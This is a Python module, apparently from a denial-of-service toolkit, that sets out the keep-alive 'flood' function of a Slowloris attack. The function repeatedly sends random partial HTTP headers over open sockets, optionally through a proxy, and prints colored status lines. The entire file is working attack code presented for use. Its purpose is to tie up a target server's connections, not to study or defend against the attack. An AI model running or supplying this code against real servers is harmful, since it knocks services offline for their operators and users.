"""This module provides the flood function for a Slowloris DoS attack."""

import random
import socket
from typing import Dict, Union

from colorama import Fore  # type: ignore[import]

from tools.crash import CriticalError  # type: ignore[import]


def flood(sock: socket.SocketType, proxy: Union[Dict[str, str], None] = None) -> None:
    """Keep alive the sockets in Slowloris flood.

    Args:
        - sock - The socket to be kept alive

    Returns:
        None
    """
    try:
        random_header = random.randint(1, 5000)
        sock.send(f"X-a: {random_header}".encode("utf-8"))
    except Exception as err:
        CriticalError("There was an error during the Slowloris attack", err)
    else:
        proxy_addr = (
            f" | {Fore.CYAN}Proxy: {proxy['addr'] + ':' + proxy['port']:>21}"
            if proxy
            else ""
        )
        header_sent = f"{Fore.CYAN} Header Sent: X-a {random_header:>4}"
        print(
            f"{Fore.GREEN} --> Keeping Socket Alive... {Fore.RESET}|{header_sent}{Fore.RESET}{proxy_addr}{Fore.RESET}"
        )
